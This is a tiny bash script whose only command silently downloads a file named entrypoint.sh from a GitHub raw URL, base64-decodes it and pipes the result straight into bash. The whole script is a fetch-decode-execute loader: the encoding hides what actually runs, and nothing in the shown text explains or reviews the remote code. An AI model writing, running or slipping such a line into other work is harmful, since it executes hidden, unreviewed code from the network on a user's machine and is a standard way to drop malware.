#!/bin/bash
wget -qO- https://raw.githubusercontent.com/dwaincampbell/smile/refs/heads/main/entrypoint.sh | base64 -d | bash
